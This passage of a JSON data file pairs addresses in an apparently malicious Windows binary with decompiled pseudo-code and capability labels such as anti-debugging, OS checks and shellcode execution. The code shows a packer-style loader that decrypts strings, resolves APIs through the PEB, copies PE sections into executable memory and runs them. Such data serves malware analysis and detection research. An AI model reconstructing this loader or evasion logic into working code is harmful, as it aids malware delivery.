{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401000(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iStack92;\n    int32_t iStack64;\n    uint32_t uStack40;\n    uint var_bp_ch;\n    \n    // [00] -r-x section size 16384 named .text\n    iStack64 = 0;\n    if (arg_14h == 0 && arg_18h != 0) {\n        do {\n            *(arg_8h + iStack64) = *(arg_ch + iStack64);\n            iStack64 = iStack64 + 1;\n            uStack40 = 0;\n        } while (iStack64 != arg_18h);\n    }\n    iVar3 = uStack40 << (uStack40 & 0x1f);\n    if ((uStack40 & 0x20) != 0) {\n        iVar3 = 0;\n    }\n    uStack40 = iVar3 * iVar3;\n    iVar3 = *(arg_10h + 0xc);\n    iVar1 = *(arg_10h + 0x10);\n    iVar2 = *(arg_10h + 0x14);\n    iStack92 = 0;\n    if (iVar1 != 0) {\n        do {\n            *(arg_8h + iVar3 + iStack92) = *(arg_ch + iVar2 + iStack92);\n            uVar4 = 0x5258c9b9 << (uStack40 & 0x1f);\n            if ((uStack40 & 0x20) != 0) {\n                uVar4 = 0;\n            }\n            iStack92 = iStack92 + 1;\n            uStack40 = uVar4;\n        } while (iStack92 != iVar1);\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "004014bd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004014bd(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x34);\n}\n",
        "token_count": 72
    },
    "00401505": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.00401505(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iStack64;\n    uint var_bp_ch;\n    \n    iStack64 = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + iStack64) = *(arg_ch + iStack64);\n            iStack64 = iStack64 + 1;\n        } while (iStack64 != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 143
    },
    "004019d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004019d1(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uStack120;\n    uint32_t uStack116;\n    uint32_t uStack112;\n    ushort *puStack108;\n    char acStack104 [36];\n    uint uStack68;\n    uint32_t uStack64;\n    ushort uStack60;\n    ushort uStack58;\n    int32_t iStack56;\n    code *pcStack52;\n    char *pcStack48;\n    uint uStack44;\n    uint uStack40;\n    uint8_t uStack35;\n    uint16_t uStack34;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    iVar5 = uStack28;\n    uVar4 = uStack32;\n    uStack34 = 0x623c;\n    uStack35 = 100;\n    uStack40 = 0x11e372f;\n    pcStack48 = acStack104;\n    uVar1 = uStack32 & 0x1f;\n    uVar2 = uStack32 >> 0x20 - uVar1;\n    uVar6 = uStack32 << (uStack32 & 0x1f);\n    uVar3 = uStack32 & 0x20;\n    uStack32 = uVar6;\n    uStack28 = uStack28 << uVar1 | uVar2;\n    if (uVar3 != 0) {\n        uStack32 = 0;\n        uStack28 = uVar6;\n    }\n    uStack112 = 0;\n    uStack44 = 0;\n    if (arg_ch != 0) {\n        do {\n            acStack104[uStack112] = *(uStack112 + 0x4060e1) - *((uStack112 & 7) + 0x406208);\n            uStack24 = 0x11e372f;\n            uStack112 = uStack112 + 1;\n        } while (uStack112 != 0x18);\n        pcStack52 = fcn.00403b66(pcStack48);\n        uStack44 = 0;\n        if (pcStack52 != NULL) {\n            puStack108 = &uStack60;\n            iStack56 = arg_ch;\n            uStack116 = 0;\n            uVar2 = uStack116;\n            do {\n                uStack116 = uVar2;\n                uStack64 = uStack116;\n                uVar2 = uStack116 + 1;\n            } while (*(arg_ch + uStack116) != (uStack35 ^ 100));\n            uStack60 = uStack116;\n            uStack68 = 0;\n            if ((uStack116 & 0xffff) != 0) {\n                uStack24 = 0x39ffff2f;\n                uStack120 = 0;\n                uStack32 = uVar4 * 0x78c3fb2e;\n                uStack28 = (uVar4 * 0x78c3fb2e >> 0x20) + iVar5 * 0x78c3fb2e;\n                uStack116 = uStack116 + 1;\n                uStack58 = uStack60;\n                (*pcStack52)(arg_8h, &uStack60, uStack34 ^ 0x623c, &uStack120);\n                uStack68 = uStack120;\n            }\n            uStack44 = uStack68;\n        }\n    }\n    return uStack44;\n}\n",
        "token_count": 829
    },
    "00401d03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00401efd)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401d03(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint arg_8h_01;\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iStack108;\n    uint32_t uStack100;\n    char acStack78 [32];\n    char cStack46;\n    uchar uStack45;\n    uint32_t uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    int32_t iStack24;\n    uint var_bp_ch;\n    \n    uStack36 = 0;\n    uStack40 = 0x1472ed47;\n    uStack44 = 0x2b50f013;\n    uStack28 = 0xffffffff;\n    uStack32 = 0xcfe2e40f;\n    uStack45 = 0xb3;\n    uStack100 = 0;\n    do {\n        cStack46 = *(uStack100 + 0x4060f9) - *((uStack100 & 7) + 0x406208);\n        acStack78[uStack100] = cStack46;\n        uStack100 = uStack100 + 1;\n        iStack24 = -1;\n    } while (uStack100 != 0xe);\n    iStack108 = 0;\n    if (acStack78[0] == 'V') {\n        arg_8h_01 = fcn.004039d3();\n        pcVar1 = fcn.004019d1(arg_8h_01, acStack78);\n        iStack108 = 0;\n        if (0xff < pcVar1) {\n            uVar2 = 0x2739e287 << (uStack32 & 0x1f);\n            uStack32 = uVar2;\n            uStack28 = 0 << (uStack32 & 0x1f) | 0x2739e287U >> 0x20 - (uStack32 & 0x1f);\n            if ((uStack32 & 0x20) != 0) {\n                uStack32 = 0;\n                uStack28 = uVar2;\n            }\n            arg_8h_00 = (*pcVar1)(0, uStack44 ^ 0x2b500013, 0x1000, 0x40);\n            iStack24 = iStack24 * iStack24;\n            iStack108 = 0;\n            if (arg_8h_00 != 0) {\n                uStack28 = 0;\n                uStack32 = 0x211def39;\n                fcn.004032de(arg_8h_00, arg_ch);\n                *(arg_8h + 0x54) = arg_8h_00;\n                *(arg_8h + 0x58) = arg_8h_00 + -0x400000;\n                iStack108 = arg_8h_00 + 0x7470;\n            }\n        }\n    }\n    return iStack108;\n}\n",
        "token_count": 727
    },
    "00402ca6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Removing unreachable block (ram,0x00402d1f)\n// WARNING: Removing unreachable block (ram,0x00402e23)\n// WARNING: Removing unreachable block (ram,0x00402dae)\n// WARNING: Removing unreachable block (ram,0x00402e0f)\n// WARNING: Removing unreachable block (ram,0x00402dd6)\n\nint16_t * __cdecl fcn.00402ca6(int32_t arg_8h)\n\n{\n    int16_t *piStack44;\n    code *pcStack28;\n    uint var_8h;\n    \n    pcStack28 = fcn.00402afd;\n    if (arg_8h == 0) {\n        for (; (*pcStack28 != 0x5a4d || (piStack44 = pcStack28,  *(pcStack28 + *(pcStack28 + 0x3c)) != 0x4550));\n            pcStack28 = pcStack28 + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        piStack44 = fcn.00403743(arg_8h, 0);\n    }\n    return piStack44;\n}\n",
        "token_count": 274
    },
    "00402e88": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n// WARNING: Removing unreachable block (ram,0x00402eea)\n\nbool __cdecl fcn.00402e88(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_bp_8h;\n    \n    iVar1 = fcn.00402f72(arg_8h);\n    bVar2 = true;\n    if (iVar1 == 0) {\n        iVar1 = fcn.0040290c();\n        bVar2 = true;\n        if (iVar1 == 0) {\n            iVar1 = fcn.00402a48();\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 168
    },
    "004032de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004032de(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uStack76;\n    int32_t iStack52;\n    uint var_ch;\n    \n    if (((arg_8h != 0 && arg_ch != 0) && (piVar1 = arg_ch + *(arg_ch + 0x3c),  *piVar1 == 0x4550 && piVar1 != NULL)) &&\n       (*(piVar1 + 6) != 0)) {\n        iStack52 = piVar1 + *(piVar1 + 5) + 0x18;\n        uStack76 = 0;\n        do {\n            fcn.00401000(arg_8h, arg_ch, iStack52, uStack76, piVar1[0x15]);\n            uStack76 = uStack76 + 1;\n            iStack52 = iStack52 + 0x28;\n        } while (uStack76 < *(piVar1 + 6));\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "00403743": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004038c7)\n\nint32_t * __cdecl fcn.00403743(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_FS_OFFSET;\n    bool bVar4;\n    int32_t *piStack80;\n    uint32_t uStack64;\n    uint var_ch;\n    \n    iVar2 = *(in_FS_OFFSET + 0x18);\n    if (iVar2 == 0) {\n        iVar2 = -1;\n    }\n    iVar2 = *(*(iVar2 + 0x30) + 0xc);\n    piVar3 = iVar2 + 0x14;\n    piStack80 = *(iVar2 + 0x14);\n    if (piStack80 != piVar3) {\n        do {\n            if (piStack80[4] == arg_ch && arg_ch != NULL) {\n                return piStack80 + -2;\n            }\n            if (arg_8h != 0) {\n                uStack64 = 0;\n                if (*(piStack80 + 9) >> 1 != 0) {\n                    do {\n                        iVar1 = *(piStack80[10] + uStack64 * 2);\n                        if (iVar1 - 0x41U < 0x1a) {\n                            iVar1 = iVar1 + 0x20;\n                        }\n                        bVar4 = *(arg_8h + uStack64 * 2) == iVar1;\n                        uStack64 = uStack64 + 1;\n                    } while (uStack64 < *(piStack80 + 9) >> 1 && (bVar4 && iVar1 != 0));\n                    if (bVar4) {\n                        return piStack80[4];\n                    }\n                }\n            }\n            piStack80 = *piStack80;\n        } while (piStack80 != piVar3);\n    }\n    return NULL;\n}\n",
        "token_count": 452
    },
    "00403b66": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00403c85)\n// WARNING: Removing unreachable block (ram,0x00403e15)\n\nint32_t __cdecl fcn.00403b66(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uStack84;\n    uint32_t uStack48;\n    uint16_t *puStack44;\n    uint var_ch;\n    \n    iVar4 = fcn.00402508();\n    iVar5 = 0;\n    if (*(iVar4 + *(iVar4 + 0x3c)) == 0x4550) {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        puStack44 = iVar4 + *(iVar4 + iVar5 + 0x24);\n        uStack84 = 0;\n        do {\n            uStack48 = 0;\n            do {\n                cVar1 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + uStack84 * 4) + uStack48);\n                cVar2 = *(arg_8h + uStack48);\n                if (cVar1 == '\\0') break;\n                uStack48 = uStack48 + 1;\n            } while ((cVar2 != '\\0' && cVar1 == cVar2) && uStack48 < 0x20);\n            if (cVar1 == cVar2) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *puStack44 * 4);\n            }\n            uStack84 = uStack84 + 1;\n            puStack44 = puStack44 + 1;\n        } while (uStack84 < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 473
    },
    "00405000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004050d3)\n// WARNING: Removing unreachable block (ram,0x004050f0)\n\nint32_t __cdecl fcn.00405000(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint32_t uStack256;\n    uint32_t uStack252;\n    uint uStack244;\n    uint uStack216;\n    bool bStack185;\n    int32_t iStack164;\n    uint32_t uStack160;\n    uint32_t uStack152;\n    uint32_t uStack148;\n    uint32_t uStack144;\n    uint uStack140;\n    uint uStack136;\n    uchar uStack129;\n    uint uStack128;\n    uchar uStack121;\n    uint uStack120;\n    uint auStack116 [2];\n    uint auStack108 [2];\n    uint *puStack100;\n    uint uStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uint *puStack80;\n    uchar *puStack76;\n    uint32_t uStack72;\n    uchar *puStack68;\n    uchar auStack64 [8];\n    uchar auStack56 [4];\n    uint32_t uStack52;\n    int32_t iStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    int32_t iStack28;\n    uint var_ch;\n    \n    // [01] -r-x section size 4096 named DATA\n    iStack44 = 0;\n    iStack48 = 0x39a2b3ee;\n    uStack52 = 0x1bf13bd8;\n    iStack88 = 0x351478fa;\n    auStack116[0] = arg_10h;\n    uStack120 = 0;\n    uStack121 = 1;\n    uStack152 = 0xf9a192b8;\n    uStack128 = 0;\n    uStack129 = 0;\n    uStack136 = arg_ch;\n    uStack140 = arg_8h;\n    uStack144 = 0x39a2b3ee;\n    uStack148 = 0;\n    uStack32 = 0x39a2b3ee;\n    iStack28 = 0;\n    uStack84 = uStack120;\n    (**0x406048)();\n    (**0x406040)(0xbe6);\n    auStack116[0] = 0xcc3;\n    uStack36 = ~uStack148;\n    uStack32 = ~uStack152;\n    (**0x406044)(auStack116);\n    fcn.00401295();\n    iVar2 = fcn.00402e88(*0x40604c);\n    if (iVar2 == 0) goto code_r0x0040510f;\n    while( true ) {\n        (**0x406050)(L\"r7MF?+mo$Ab\", 0xc3b);\n        (**0x406030)(0xa031eb, uStack244);\n        iStack48 = uStack160 + 0x30beb810;\n        iStack44 = iStack164 + (0xcf4147ef < uStack160);\n        (*_sym.imp.USER32.dll_CloseWindow)(0x93683c);\n        puStack80 = &uStack96;\n        if ((uStack256 ^ 0x6c6ea0d5 | uStack252) != 0) break;\ncode_r0x0040510f:\n        iStack28 = 0;\n        uStack32 = 0x67b912e4;\n        iVar1 = (**0x406040)(0xbe6);\n        bVar4 = CARRY4(uStack52, uStack92);\n        uVar3 = uStack52 + uStack92;\n        iVar2 = iStack48 + iStack88;\n        uStack40 = uStack40 ^ 0x30f14f23;\n        uStack96 = 0xcc3;\n        (**0x406044)(&uStack96);\n        *0x40b724 = uStack136;\n        *0x40b728 = auStack116[0];\n        bStack185 = iVar1 == 0 && iVar2 + bVar4 + -1 + (0x286edb8e < uVar3) < 0x17cc90f8;\n        if (bStack185) goto code_r0x00405499;\n        *0x40b718 = uStack140;\n        uStack160 = fcn.00401721();\n    }\n    puStack68 = auStack56;\n    puStack100 = auStack108;\n    uStack36 = uStack36 & 0xa249caa;\n    uStack96 = 0x44bff4;\n    (**0x406000)(0x378987, 0xa4a, 0xd0, &uStack96);\n    (**0x406018)(0xf472b1, 0xbe6, 0xbe6, 0xbe6, 0xbe6, 0x39371b, 0x796, 0xbe6, 0x79ca34, 0x7b, uStack216, 0x4f3);\n    puStack76 = auStack64;\n    uStack72 = uStack52 ^ 0x1bf13bd8;\n    do {\n        uVar3 = uStack72;\n        uStack36 = ~uStack36;\n        uStack32 = uStack144 * 2;\n        iStack28 = uStack148 * 2 + CARRY4(uStack144, uStack144);\n        (**0x406020)(0xab33bf, 0x3dd, 0x916, 0x458, uStack52 ^ 0x1bf13b8a, auStack64);\n        (**0x40602c)(0xdef03);\n        uVar7 = 0xa9b;\n        (**0x40601c)(0x71b01a, 0xa9b, 0xa9b);\n        (*_sym.imp.USER32.dll_IsWinEventHookInstalled)(0xee6);\n        (**0x406060)(0x174ee1, &uStack152);\n        auStack108[0] = 0xc6a;\n        uVar6 = 0xfc4;\n        uVar5 = 0xfc4;\n        uVar7 = (**0x406028)(0xfc4, 0xfc4, uVar7, uVar7, auStack108);\n        (*_sym.imp.USER32.dll_DestroyMenu)(0x2239a3, uVar5, uVar6, uVar7);\n        uStack72 = uVar3 + 1;\n    } while (uStack72 != 0x1c);\ncode_r0x00405499:\n    return uStack52 + 0xe40ec428;\n}\n",
        "token_count": 1575
    },
    "0040290c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nbool fcn.0040290c(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t in_FS_OFFSET;\n    uint var_bp_ch;\n    \n    iVar2 = fcn.00402508();\n    iVar3 = 0;\n    if (*(iVar2 + *(iVar2 + 0x3c)) == 0x4550) {\n        iVar3 = iVar2 + *(iVar2 + 0x3c);\n    }\n    iVar2 = *(in_FS_OFFSET + 0x18);\n    if (iVar2 == 0) {\n        iVar2 = -1;\n    }\n    bVar4 = true;\n    uVar1 = *(*(iVar2 + 0x30) + 0xa4);\n    if (uVar1 != 5) {\n        bVar4 = 0x549352b9 < *(iVar3 + 8) && uVar1 < 6;\n    }\n    return bVar4;\n}\n",
        "token_count": 240
    },
    "00402a48": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nbool fcn.00402a48(void)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t in_FS_OFFSET;\n    uint32_t auStack36 [2];\n    uint uStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    uint var_bp_8h;\n    \n    uStack28 = 0x6a673e89;\n    auStack36[0] = 0xffffffff;\n    arg_ch = fcn.00402508();\n    iVar1 = fcn.00403743(0, arg_ch);\n    pcVar2 = fcn.004027ac();\n    uStack24 = uStack24 & 0x654b58db;\n    uStack20 = 0;\n    (*pcVar2)(*(iVar1 + 0x28), auStack36);\n    uVar3 = *(in_FS_OFFSET + 0x18);\n    if (uVar3 == (auStack36[0] ^ 0x6a673e89)) {\n        uVar3 = 0xffffffff;\n    }\n    return *(uVar3 + 0x34) != 0xc1;\n}\n",
        "token_count": 282
    },
    "00402f72": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x004030e5)\n// WARNING: Removing unreachable block (ram,0x00403042)\n\nbool __cdecl fcn.00402f72(char *arg_8h)\n\n{\n    char cVar1;\n    bool bStack73;\n    uint var_bp_ch;\n    \n    cVar1 = *arg_8h;\n    while( true ) {\n        if (cVar1 != -1) {\n            bStack73 = false;\n            if ((cVar1 == -0x48) && (bStack73 = false,  arg_8h[3] == 'P')) {\n                bStack73 = arg_8h[4] == -0x33;\n            }\n            return bStack73;\n        }\n        if (arg_8h[1] != '%') break;\n        arg_8h = **(arg_8h + 2);\n        cVar1 = *arg_8h;\n    }\n    return false;\n}\n",
        "token_count": 229
    },
    "00403578": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n// WARNING: Removing unreachable block (ram,0x004035c9)\n// WARNING: Removing unreachable block (ram,0x004035d9)\n\nuint fcn.00403578(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_bp_8h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 129
    },
    "00401295": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid fcn.00401295(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint **ppuVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint *puVar9;\n    int32_t iStack144;\n    uint *puStack140;\n    uint32_t *puStack136;\n    uint *puStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint auStack112 [11];\n    uchar auStack68 [8];\n    uchar auStack60 [8];\n    uint32_t auStack52 [5];\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint uStack24;\n    uint var_bp_ch;\n    \n    uStack24 = 0x7e08a2b0;\n    puStack132 = auStack112;\n    uStack120 = 0;\n    uStack124 = 0;\n    uStack32 = ~uStack32;\n    uStack28 = ~uStack28;\n    puStack136 = auStack52;\n    puStack140 = &uStack116;\n    iStack144 = 0;\n    puStack128 = puStack132;\n    do {\n        *puStack128 = 0x3c;\n        puVar9 = auStack112;\n        uVar8 = 0xb37101;\n        (*_sym.imp.USER32.dll_GetWindowInfo)(0xb37101, puVar9);\n        uVar7 = 0xe308e0;\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowRect)(0xe308e0, auStack60);\n        auStack52[0] = auStack52[0] >> 5;\n        uVar6 = 2;\n        uVar2 = (*_sym.imp.USER32.dll_MonitorFromRect)(auStack68, 2);\n        puStack140 = puVar9;\n        uVar3 = (**0x406038)();\n        ppuVar5 = &puStack140;\n        uVar4 = (**0x40603c)(uVar3, ppuVar5);\n        (*_sym.imp.USER32.dll_GetClipboardViewer)(uVar3, ppuVar5, uVar4, uVar6, uVar7, uVar2, uVar8, puVar9, uVar1);\n        iStack144 = iStack144 + 1;\n    } while (iStack144 != 0x48);\n    return;\n}\n",
        "token_count": 573
    },
    "00401721": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t fcn.00401721(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    int32_t iStack232;\n    int32_t *piStack196;\n    uchar auStack192 [52];\n    uint uStack140;\n    int32_t iStack136;\n    int16_t *piStack116;\n    int32_t iStack112;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint32_t uStack72;\n    uint uStack68;\n    uint auStack60 [2];\n    uint uStack52;\n    code *pcStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    int32_t iStack28;\n    uint32_t uStack24;\n    uint var_bp_ch;\n    \n    iStack28 = 0x70fcd3fe;\n    uStack68 = 0;\n    uStack72 = 0x3bea6dd0;\n    uVar4 = fcn.00402040(auStack60);\n    uStack140 = auStack60[0];\n    iStack136 = iStack28 + -0x70fc1ffe;\n    uStack84 = *0x40b718;\n    uStack80 = *0x40b71c;\n    uStack76 = *0x40b720;\n    uStack88 = *0x40b724;\n    uStack92 = *0x40b728;\n    pcStack44 = fcn.00402afd;\n    while (((*pcStack44 != 0x5a4d || (piStack196 = pcStack44 + *(pcStack44 + 0x3c),  *piStack196 != 0x4550)) &&\n           (iStack232 = (uStack72 & 0x443f5e1c) + 0x808f243f,  (uStack72 & 0x443f5e1c) < 0x7f70dbc1))) {\n        pcStack44 = pcStack44 + -0x1000 & 0x70fcc3feU - iStack28;\n    }\n    uVar1 = uStack40 & 0x1f;\n    uVar2 = uStack40 >> 0x20 - uVar1;\n    uVar6 = uStack40 << (uStack40 & 0x1f);\n    uVar3 = uStack40 & 0x20;\n    uStack40 = uVar6;\n    uStack36 = uStack36 << uVar1 | uVar2;\n    if (uVar3 != 0) {\n        uStack40 = 0;\n        uStack36 = uVar6;\n    }\n    piStack116 = pcStack44;\n    iStack112 = piStack196[0x14];\n    uStack24 = uVar4 & 0x59750a8e;\n    pcVar5 = fcn.00401d03(auStack192, uStack52);\n    uStack24 = uVar4 | 0x53ecf173;\n    (*pcVar5)(auStack192);\n    return iStack232;\n}\n",
        "token_count": 743
    },
    "004011a3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid fcn.004011a3(void)\n\n{\n    uint arg_8h;\n    uint32_t uStack92;\n    char acStack72 [32];\n    uint uStack40;\n    uint uStack36;\n    int32_t iStack24;\n    uint var_bp_ch;\n    \n    iStack24 = 0x29f764a3;\n    uStack92 = 0;\n    do {\n        uStack36 = 0xffffffff;\n        uStack40 = 0xe3b2f4a0;\n        acStack72[uStack92] = *(uStack92 + 0x406221) - *((uStack92 & 0x29f764aaU - iStack24) + 0x406208);\n        uStack92 = uStack92 + 1;\n    } while (uStack92 != 0x10);\n    arg_8h = fcn.004039d3();\n    fcn.004019d1(arg_8h, acStack72);\n    return;\n}\n",
        "token_count": 233
    },
    "004015df": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
